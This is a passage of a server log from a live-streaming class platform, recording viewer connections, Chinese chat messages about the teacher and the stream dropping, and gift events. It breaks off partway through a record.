[2021-04-25 14:19:25.076] [INFO] - [ 'FeamAP4aYuStPdS8ADFc', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:19:30.415] [INFO] - msg { role: 0,
  username: '顾众义',
  _id: '9Uh1Jey3_sFRJ_F3ADEt',
  msg: '学员肩膀在升降' }
[2021-04-25 14:19:46.387] [INFO] - msg { role: 0,
  username: '大小石头的妈',
  _id: 'adJMcJA4rKqMADbTADFC',
  msg: '他不够放松' }
[2021-04-25 14:19:52.585] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '2d650ee3b38b43769c4984c92b96ea94',
  username: '朝珏',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7hp9D' }
[2021-04-25 14:19:52.585] [INFO] - [ 'rQjHrx6rblK-83iRADFd', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:19:53.620] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'cb6d0fcfa9594d7c925b7f9f00c638d1',
  username: '美美',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7hpBg' }
[2021-04-25 14:19:53.620] [INFO] - [ 'rCoCEN9aS3z9zGQTADFe', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:20:08.380] [INFO] - msg { role: 0,
  username: '戚年凤',
  _id: '5uGXzmHkG2bLic2qADFX',
  msg: '戚年凤' }
[2021-04-25 14:20:12.982] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'cb6d0fcfa9594d7c925b7f9f00c638d1',
  username: '美美',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7htwA' }
[2021-04-25 14:20:12.983] [INFO] - [ 'ztM1NZMbbNBdx3-IADFf', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:20:19.549] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7hvWS' }
[2021-04-25 14:20:19.549] [INFO] - [ 'gM9A0FQw8Zg4hr9tADFg', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:20:25.944] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'eb909a73018045f090d5466850f74e13',
  username: '耿升平',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7hxsN' }
[2021-04-25 14:20:25.944] [INFO] - [ 'uWM9hcyAlNfmWP20ADFh', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:20:27.644] [INFO] - msg { role: 0,
  username: '四方楠',
  _id: 'o1avAqQNoxCifVxrADFP',
  msg: '学生质量太差' }
[2021-04-25 14:20:45.785] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7i0HI' }
[2021-04-25 14:20:45.785] [INFO] - [ 'NgyzQ-ff_HHXmxl6ADFi', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:20:51.937] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd3895ef97d954417b5c32f00fe30a7f0',
  username: '戚年凤',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7i14W' }
[2021-04-25 14:20:51.938] [INFO] - [ 'drl-d9M5HQJv0uGeADFj', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:21:03.118] [INFO] - msg { role: 0,
  username: '顾福龙',
  _id: 'T7O6wVoSZJcZ-BgIADFU',
  msg: '老师是好老师' }
[2021-04-25 14:21:15.183] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'cb6d0fcfa9594d7c925b7f9f00c638d1',
  username: '美美',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7i763' }
[2021-04-25 14:21:15.183] [INFO] - [ 'e0bN5GrhY2033fAAADFk', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:21:40.961] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd3895ef97d954417b5c32f00fe30a7f0',
  username: '戚年凤',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iD2W' }
[2021-04-25 14:21:40.962] [INFO] - [ 'y-55iAbmMnUfxIrIADFl', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:21:49.833] [INFO] - msg { role: 0,
  username: '美美',
  _id: 'e0bN5GrhY2033fAAADFk',
  msg: '老师讲的课通熟易懂' }
[2021-04-25 14:21:56.369] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '2be370720e2041618b71be262dfa0207',
  username: '洪岐民',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iH7x' }
[2021-04-25 14:21:56.369] [INFO] - [ 'BS-7rB7_wuIMKLepADFm', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:22:13.123] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iLLn' }
[2021-04-25 14:22:13.123] [INFO] - [ 'lvEvv8ksLwRH_nX3ADFn', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:22:45.051] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a7c4651de48c44469fd4b1daa9fdcd72',
  username: '蓝天',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iTLE' }
[2021-04-25 14:22:45.051] [INFO] - [ 'ARmCmsJr7RZqfgvwADFo', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:22:45.655] [INFO] - msg { role: 0,
  username: '善良夫人wl',
  _id: '1hpb2lpITZcHKU2jADFL',
  msg: '老师讲的很到位！都是实实在在的干货' }
[2021-04-25 14:23:03.533] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'eb909a73018045f090d5466850f74e13',
  username: '耿升平',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iYIL' }
[2021-04-25 14:23:03.533] [INFO] - [ 'XQGMYIaCEfVFm2_2ADFp', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:23:17.948] [INFO] - msg { role: 0,
  username: '蓝天',
  _id: 'ARmCmsJr7RZqfgvwADFo',
  msg: '老师讲的非常好' }
[2021-04-25 14:23:21.127] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a8b239cf558348819f34794ee4db88b4',
  username: '西湖客',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7icOE' }
[2021-04-25 14:23:21.128] [INFO] - [ 'iK3uuSXCNq7iiEs2ADFq', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:23:32.554] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iZam' }
[2021-04-25 14:23:32.554] [INFO] - [ 'naCwqsRs9wFaCvRtADFr', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:23:40.417] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'eb909a73018045f090d5466850f74e13',
  username: '耿升平',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ihP7' }
[2021-04-25 14:23:40.417] [INFO] - [ 'y6WdsjtOgARnFdGJADFs', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:23:49.261] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a7c4651de48c44469fd4b1daa9fdcd72',
  username: '蓝天',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ii_6' }
[2021-04-25 14:23:49.262] [INFO] - [ '8z-lE07dgNRmqNOAADFt', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:23:56.739] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd3895ef97d954417b5c32f00fe30a7f0',
  username: '戚年凤',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ikC0' }
[2021-04-25 14:23:56.739] [INFO] - [ 'CJZbqsQQJsZ4JlHdADFu', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:23:59.043] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'c02238742a48480c8dd7e8a6e1deb6b6',
  username: '善良夫人wl',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ilAC' }
[2021-04-25 14:23:59.044] [INFO] - [ 'I5DS5eQH1Xzb7ak2ADFv', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:09.547] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7inSG' }
[2021-04-25 14:24:09.547] [INFO] - [ 'z7WtxCTQlmD89wlrADFw', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:12.210] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'eb909a73018045f090d5466850f74e13',
  username: '耿升平',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ip4B' }
[2021-04-25 14:24:12.211] [INFO] - [ 'pe8eYbfskf5UE7POADFx', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:12.334] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd3895ef97d954417b5c32f00fe30a7f0',
  username: '戚年凤',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7in_m' }
[2021-04-25 14:24:12.334] [INFO] - [ 'JjSYSitWYRnIF8xFADFy', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:18.121] [INFO] - msg { role: 0,
  username: '笑笑',
  _id: 'dmIKfNEOVuI2TlvjADFV',
  msg: '听不到了' }
[2021-04-25 14:24:20.651] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '8c84c0e5397e41ffa58f1669173e21a5',
  username: '杨',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iqPd' }
[2021-04-25 14:24:20.652] [INFO] - [ '4h889WS1rkWkNIxHADFz', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:28.365] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aaef6c66eec8406cb35cf0e9ca61d51d',
  username: 'mgy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7isK8' }
[2021-04-25 14:24:28.365] [INFO] - [ 'utD8FleZW241O1fgADF0', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:31.582] [INFO] - gift { role: 0,
  _id: 'iK3uuSXCNq7iiEs2ADFq',
  msg: '666',
  num: 1,
  img: 'https://culturecloud-live.oss-cn-shanghai.aliyuncs.com/gift/666.gif' }
[2021-04-25 14:24:33.822] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '59227fe333ee418ca95d750543227321',
  username: '朱秀英',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iuM6' }
[2021-04-25 14:24:33.822] [INFO] - [ 'LQKrwj0A4hNaspE0ADF1', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:38.027] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '54df0ace363e43938e5b8e5c83c91736',
  username: '四方楠',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iuvk' }
[2021-04-25 14:24:38.027] [INFO] - [ 'qhqzyuDVEVUASqvuADF2', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:39.066] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '2be370720e2041618b71be262dfa0207',
  username: '洪岐民',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ius3' }
[2021-04-25 14:24:39.066] [INFO] - [ 'FmEnUnVcRgEIArvwADF3', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:42.584] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a7c4651de48c44469fd4b1daa9fdcd72',
  username: '蓝天',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iw1N' }
[2021-04-25 14:24:42.585] [INFO] - [ 'kxuV6DnFR1i1qVJGADF4', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:45.860] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '60bcbfb463c941af8c186cfd0878654a',
  username: 'xiaoying',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7iwpi' }
[2021-04-25 14:24:45.862] [INFO] - [ 'adhM8o2hQcSE5u0MADF5', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:52.369] [INFO] - gift { role: 0,
  _id: 'z7WtxCTQlmD89wlrADFw',
  msg: '666',
  num: 1,
  img: 'https://culturecloud-live.oss-cn-shanghai.aliyuncs.com/gift/666.gif' }
[2021-04-25 14:24:58.313] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd3895ef97d954417b5c32f00fe30a7f0',
  username: '戚年凤',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7izE3' }
[2021-04-25 14:24:58.313] [INFO] - [ 'h4hgYdMtJuvZaD7yADF6', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:24:59.786] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7izjH' }
[2021-04-25 14:24:59.786] [INFO] - [ 'O6N4QOOnwdmF0mBBADF7', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:25:03.406] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '802f7070d322497285b0217a293c573b',
  username: '笑笑',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7i-zx' }
[2021-04-25 14:25:03.407] [INFO] - [ 'qp7oM2i2RP-8YOWxADF8', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:25:04.938] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'ec63bb9606ef4ba0b64ecd32bd6e0b10',
  username: '王胜娥',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7i_BO' }
[2021-04-25 14:25:04.938] [INFO] - [ 'dvENg7wKxbncT9WQADF9', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:25:08.772] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd3895ef97d954417b5c32f00fe30a7f0',
  username: '戚年凤',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7i_na' }
[2021-04-25 14:25:08.772] [INFO] - [ 'gpI7ChXyz7ST-sNcADF-', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:25:09.363] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '6aa9186bba864313985c85cfae757997',
  username: '翁幼奇',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7j0ST' }
[2021-04-25 14:25:09.363] [INFO] - [ 'Mh9aRsF0OvUpiB1AADF_', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:25:32.348] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a80e7770892c4dff98b30560c7ac7cae',
  username: '小云',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7j68F' }
[2021-04-25 14:25:32.348] [INFO] - [ 'QkzIBvxNpF4s4TuFADGA', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:25:39.809] [INFO] - gift { role: 0,
  _id: '9Uh1Jey3_sFRJ_F3ADEt',
  msg: '棒棒糖',
  num: 1,
  img: 'https://culturecloud-live.oss-cn-shanghai.aliyuncs.com/gift/棒棒糖.gif' }
[2021-04-25 14:25:49.107] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a8b239cf558348819f34794ee4db88b4',
  username: '西湖客',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jAYz' }
[2021-04-25 14:25:49.108] [INFO] - [ 'eegZm1FT_hlLGHqYADGB', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:25:51.363] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jAf9' }
[2021-04-25 14:25:51.363] [INFO] - [ 'zLYWPb_K8sSAHXWfADGC', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:25:53.322] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a7c4651de48c44469fd4b1daa9fdcd72',
  username: '蓝天',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jBIo' }
[2021-04-25 14:25:53.323] [INFO] - [ 'epbZ0xwnuQydYOojADGD', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:25:57.705] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '6aa9186bba864313985c85cfae757997',
  username: '翁幼奇',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jCEk' }
[2021-04-25 14:25:57.705] [INFO] - [ '-BleoENzTPeDv3ZaADGE', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:01.417] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '4a61d7c8574746f3ba016775ff7213d8',
  username: '倪铁城',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jD7q' }
[2021-04-25 14:26:01.417] [INFO] - [ 'R88ltS6FYJxF1zjxADGF', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:03.321] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '2d650ee3b38b43769c4984c92b96ea94',
  username: '朝珏',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jDfw' }
[2021-04-25 14:26:03.321] [INFO] - [ '3rNnDlUsbPm8TetpADGG', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:05.709] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '54df0ace363e43938e5b8e5c83c91736',
  username: '四方楠',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jELU' }
[2021-04-25 14:26:05.709] [INFO] - [ '0cKKrbT4-Ou5BaAsADGH', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:08.862] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'cb6d0fcfa9594d7c925b7f9f00c638d1',
  username: '美美',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jEos' }
[2021-04-25 14:26:08.862] [INFO] - [ 'FBjfy7ZVXC94BXVIADGI', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:15.395] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '2d650ee3b38b43769c4984c92b96ea94',
  username: '朝珏',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jGcr' }
[2021-04-25 14:26:15.396] [INFO] - [ 'x-vhgqUQHshDGJQhADGJ', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:15.520] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '64aa143b78cc407483398906d4da2b83',
  username: '顾福龙',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jGp1' }
[2021-04-25 14:26:15.521] [INFO] - [ 'YBQ4KMRwSj7_yMn3ADGK', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:19.491] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '54df0ace363e43938e5b8e5c83c91736',
  username: '四方楠',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jHik' }
[2021-04-25 14:26:19.493] [INFO] - [ 'pbJFDAxvsJw4nHWHADGL', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:21.319] [INFO] - gift { role: 0,
  _id: 'gpI7ChXyz7ST-sNcADF-',
  msg: '棒棒糖',
  num: 1,
  img: 'https://culturecloud-live.oss-cn-shanghai.aliyuncs.com/gift/棒棒糖.gif' }
[2021-04-25 14:26:21.376] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jHRS' }
[2021-04-25 14:26:21.377] [INFO] - [ 'uVLi_zF_GbZuBqo4ADGM', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:29.281] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '2be370720e2041618b71be262dfa0207',
  username: '洪岐民',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jJk_' }
[2021-04-25 14:26:29.281] [INFO] - [ 'SHNalRCMBjhO6lvTADGN', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:34.712] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a7c4651de48c44469fd4b1daa9fdcd72',
  username: '蓝天',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jLPd' }
[2021-04-25 14:26:34.712] [INFO] - [ 'Q2TYhAh6vKJUbNFzADGO', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:39.016] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '64aa143b78cc407483398906d4da2b83',
  username: '顾福龙',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jMYE' }
[2021-04-25 14:26:39.016] [INFO] - [ 'IfBu53DhGOfBfVF_ADGP', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:43.578] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jN3E' }
[2021-04-25 14:26:43.578] [INFO] - [ 'AMZ_kxozBL6Tl5C8ADGQ', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:46.827] [INFO] - msg { role: 0,
  username: 'why3a3c449873',
  _id: 'XviABZap7FbQ-cltADFJ',
  msg: '怎么了？' }
[2021-04-25 14:26:53.435] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '54df0ace363e43938e5b8e5c83c91736',
  username: '四方楠',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jP_5' }
[2021-04-25 14:26:53.436] [INFO] - [ 'Mgnv2C2DAhiyJvEwADGR', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:54.970] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jQ5l' }
[2021-04-25 14:26:54.970] [INFO] - [ 'kN7sVnkLbi9-cZCTADGS', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:26:55.354] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '2d650ee3b38b43769c4984c92b96ea94',
  username: '朝珏',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jQMw' }
[2021-04-25 14:26:55.356] [INFO] - [ '5_J93csWF4sKZQa7ADGT', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:27:06.569] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '2d650ee3b38b43769c4984c92b96ea94',
  username: '朝珏',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jT6D' }
[2021-04-25 14:27:06.570] [INFO] - [ 'xDVGgfO9wJtMOwbCADGU', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:27:13.085] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '4a61d7c8574746f3ba016775ff7213d8',
  username: '倪铁城',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jUdY' }
[2021-04-25 14:27:13.085] [INFO] - [ 's0b2EjS-xEExLXijADGV', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:27:18.031] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jVTH' }
[2021-04-25 14:27:18.031] [INFO] - [ 'p220UzklRoKbHDqmADGW', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:27:26.797] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '2be370720e2041618b71be262dfa0207',
  username: '洪岐民',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jXoo' }
[2021-04-25 14:27:26.797] [INFO] - [ 'tnwukzou5IbDORIwADGX', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:27:27.381] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '4a61d7c8574746f3ba016775ff7213d8',
  username: '倪铁城',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jY7B' }
[2021-04-25 14:27:27.381] [INFO] - [ 'lCluuesTzM1dm9jQADGY', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:27:28.027] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'ec63bb9606ef4ba0b64ecd32bd6e0b10',
  username: '王胜娥',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jY7K' }
[2021-04-25 14:27:28.027] [INFO] - [ 'xd9QuqAA1b-ETLzwADGZ', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:27:33.321] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '54df0ace363e43938e5b8e5c83c91736',
  username: '四方楠',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jZkM' }
[2021-04-25 14:27:33.321] [INFO] - [ 'mzVUbwkUSJ_zchg1ADGa', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:27:38.017] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a7c4651de48c44469fd4b1daa9fdcd72',
  username: '蓝天',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jasq' }
[2021-04-25 14:27:38.019] [INFO] - [ 'lpHwIZ0wEU8UDcyjADGb', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:27:40.138] [INFO] - msg { role: 0,
  username: '戚年凤',
  _id: 'gpI7ChXyz7ST-sNcADF-',
  msg: '听不到了' }
[2021-04-25 14:27:57.482] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a7c4651de48c44469fd4b1daa9fdcd72',
  username: '蓝天',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jfcy' }
[2021-04-25 14:27:57.482] [INFO] - [ 'y4RFc506xwCECrBLADGc', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:28:02.063] [INFO] - msg { role: 0,
  username: 'why3a3c449873',
  _id: 'XviABZap7FbQ-cltADFJ',
  msg: '黑屏了' }
[2021-04-25 14:28:18.325] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '65d257278eea4a34b574fc43ad666e5f',
  username: '淡泊',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jkTt' }
[2021-04-25 14:28:18.325] [INFO] - [ 'YXuzvoAnjto6zFpxADGd', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:28:24.483] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd0a0829582ed473dbc67c1330451ff69',
  username: 'why3a3c449873',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7jlmL' }
[2021-04-25 14:28:24.483] [INFO] - [ 'i0R1aRnUer43U6fLADGe', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:28:47.721] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '04a57ba3c32e45499b70860b39c98a6a',
  username: '许静芬',
  role: '0',
